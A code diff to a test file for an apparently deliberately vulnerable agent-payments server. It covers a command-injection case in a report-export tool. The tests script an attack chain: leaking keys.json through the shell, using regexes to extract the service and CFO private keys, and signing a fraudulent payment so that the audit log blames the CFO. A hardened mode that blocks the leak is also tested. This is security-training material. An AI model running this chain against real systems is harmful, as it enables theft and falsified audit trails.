@@ -1,5 +1,6 @@
 import fs from 'node:fs';
 import path from 'node:path';
+import { signMessage } from '../src/common/crypto';
 import { Client } from '@modelcontextprotocol/sdk/client/index.js';
 import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
@@ -22,19 +23,20 @@ describe('V10 — command injection in export_report (Pwn)', () => {
 
   it('default: the title runs in a shell and leaks every secret in keys.json', async () => {
     const r = await exportReport(leak());
-    expect(r.text).toContain(t.keys.cfoToken);
+    expect(r.text).toContain(t.keys.cfoPrivateKey);
     expect(r.text).toContain(t.keys.serviceKey);
   });
 
-  it('default: the leaked CFO token + service key let the attacker approve their own payment, no CFO involved', async () => {
+  it('default: the leaked CFO signing key + service key let the attacker sign their own payment, no CFO involved', async () => {
     const pay = await t.client.updatePolicy(t.keys.agentId, 'setup', { allowPayees: ['p_globex'], trustPayees: ['p_globex'], perTxCap: '20000000000' });
     expect(pay.allowedPayees).toContain('p_globex');
     const p = await t.client.createPayment({ agentId: t.keys.agentId, invoiceId: 'INV-2001', payeeId: 'p_globex', amount: '9500000000' });
     const loot = (await exportReport(leak())).text; // the attacker just greps the response for secrets
-    const stolen = { serviceKey: /svc_[0-9a-f]+/.exec(loot)![0], cfoToken: /cfo_[0-9a-f]+/.exec(loot)![0] };
+    const stolen = { serviceKey: /svc_[0-9a-f]+/.exec(loot)![0], cfoKey: /cfoPrivateKey\\*"\s*:\s*\\*"([A-Za-z0-9+/=]+)/.exec(loot)![1]! };
     const before = await bal(t, 'acct_globex');
     const attacker = new (t.client.constructor as new (u: string, k: string) => typeof t.client)(t.urls.ledger, stolen.serviceKey);
-    await attacker.approvePayment(p.id, stolen.cfoToken);
+    const txn = await attacker.paymentTransaction(p.id); // the pending transaction, read with the stolen service key
+    await attacker.signPayment(p.id, 'cfo', signMessage(stolen.cfoKey, txn.message)); // signed with the stolen CFO key
     expect(await bal(t, 'acct_globex')).toBe(before + 9_500_000_000);
     expect((await t.client.audit()).entries.some((e) => e.actor === 'cfo' && e.action === 'payment.approved')).toBe(true); // audit says the CFO did it
   });
@@ -43,7 +45,7 @@ describe('V10 — command injection in export_report (Pwn)', () => {
     process.env.DVAP_HARDEN = 'V10';
     const bad = await exportReport(leak());
     expect(bad.isError).toBe(true);
-    expect(bad.text).not.toContain(t.keys.cfoToken);
+    expect(bad.text).not.toContain(t.keys.cfoPrivateKey);
     const ok = await exportReport('Q3 payables');
     expect(JSON.parse(ok.text).preview).toBe('Report: Q3 payables');
     expect(fs.readdirSync(path.join(t.dir, 'reports')).length).toBe(1);
